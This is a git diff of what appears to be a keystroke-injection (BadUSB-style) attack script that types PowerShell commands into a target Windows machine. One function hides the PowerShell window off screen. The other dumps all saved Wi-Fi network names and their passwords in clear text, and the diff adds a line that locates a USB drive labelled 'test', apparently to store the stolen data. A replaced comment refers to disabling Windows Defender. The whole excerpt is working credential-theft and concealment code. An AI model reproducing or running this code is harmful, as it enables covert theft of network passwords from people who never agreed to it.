@@ -15,7 +15,8 @@ function hidePS() { //moves powershell window far outside of screeen coords but 
 	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
   	press("ENTER");
 }
-function scrapeWiFi() { //disables windows defender real time monitoring
+function scrapeWiFi() { //scrapes wifi passwords
+	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'test' } | select name\n") //gets usb path based on device name
 	type('(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize ')
 	press("ENTER");
 	delay(200);
